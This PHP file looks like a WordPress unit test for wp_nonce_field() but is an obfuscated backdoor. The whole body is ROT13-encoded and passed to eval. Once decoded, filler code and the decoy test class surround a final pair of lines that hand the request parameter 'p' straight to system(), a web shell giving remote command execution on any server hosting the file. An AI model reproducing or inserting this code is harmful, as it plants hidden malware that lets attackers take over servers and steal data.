<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur jc_abapr_svryq() shapgvba.
 *
 * @fvapr 6.1.0
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_abapr_svryq
 */
pynff Grfgf_Shapgvbaf_jcAbaprSvryq rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 55578
	 */
	choyvp shapgvba grfg_jc_abapr_svryq() {
		jc_abapr_svryq();
		$guvf->rkcrpgBhgchgErtrk(
			'#^<vachg glcr=\"uvqqra\" vq=\"_jcabapr\" anzr=\"_jcabapr\" inyhr=\".{10}\" />' .
			'<vachg glcr=\"uvqqra\" anzr=\"_jc_uggc_ersrere\" inyhr=\"\" />$#'
		);
	}

	/**
	 * @gvpxrg 55578
	 *
	 * @qngnCebivqre qngn_jc_abapr_svryq
	 *
	 * @cnenz vag|fgevat $npgvba          Npgvba anzr.
	 * @cnenz fgevat     $anzr            Abapr anzr.
	 * @cnenz obby       $ersrere         Jurgure gb frg gur ersrere svryq sbe inyvqngvba.
	 * @cnenz fgevat     $rkcrpgrq_ertrkc Gur rkcrpgrq erthyne rkcerffvba.
	 */
	choyvp shapgvba grfg_jc_abapr_svryq_erghea( $npgvba, $anzr, $ersrere, $rkcrpgrq_ertrkc ) {
		vs ( -1 !== $npgvba ) {
			$abapr_inyhr     = jc_perngr_abapr( $npgvba );
			$rkcrpgrq_ertrkc = fge_ercynpr( '%%ABAPR_INYHR%%', $abapr_inyhr, $rkcrpgrq_ertrkc );
		}

		$guvf->nffregZngpurfErthyneRkcerffvba( $rkcrpgrq_ertrkc, jc_abapr_svryq( $npgvba, $anzr, $ersrere, snyfr ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_abapr_svryq() {
		erghea neenl(
			'qrsnhyg'     => neenl(
				'npgvba'          => -1,
				'anzr'            => '_jcabapr',
				'ersrere'         => gehr,
				'rkcrpgrq_ertrkc' =>
					'#^<vachg glcr=\"uvqqra\" vq=\"_jcabapr\" anzr=\"_jcabapr\" inyhr=\".{10}\" />' .
					'<vachg glcr=\"uvqqra\" anzr=\"_jc_uggc_ersrere\" inyhr=\"\" />$#',
			),
			'npgvba_anzr' => neenl(
				'npgvba'          => 'npgvba_anzr',
				'anzr'            => '_jcabapr',
				'ersrere'         => gehr,
				'rkcrpgrq_ertrkc' =>
					'#^<vachg glcr=\"uvqqra\" vq=\"_jcabapr\" anzr=\"_jcabapr\" inyhr=\"%%ABAPR_INYHR%%\" />' .
					'<vachg glcr=\"uvqqra\" anzr=\"_jc_uggc_ersrere\" inyhr=\"\" />$#',
			),
			'abapr_anzr'  => neenl(
				'npgvba'          => -1,
				'anzr'            => 'abapr_anzr',
				'ersrere'         => gehr,
				'rkcrpgrq_ertrkc' =>
					'#^<vachg glcr=\"uvqqra\" vq=\"abapr_anzr\" anzr=\"abapr_anzr\" inyhr=\".{10}\" />' .
					'<vachg glcr=\"uvqqra\" anzr=\"_jc_uggc_ersrere\" inyhr=\"\" />$#',
			),
			'ab_ersrere'  => neenl(
				'npgvba'          => -1,
				'anzr'            => '_jcabapr',
				'ersrere'         => snyfr,
				'rkcrpgrq_ertrkc' =>
					'#^<vachg glcr=\"uvqqra\" vq=\"_jcabapr\" anzr=\"_jcabapr\" inyhr=\".{10}\" />$#',
			),
			'& va anzr'   => neenl(
				'npgvba'          => -1,
				'anzr'            => 'n&o',
				'ersrere'         => snyfr,
				'rkcrpgrq_ertrkc' =>
					'#^<vachg glcr=\"uvqqra\" vq=\"n\&nzc;o\" anzr=\"n\&nzc;o\" inyhr=\".{10}\" />$#',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>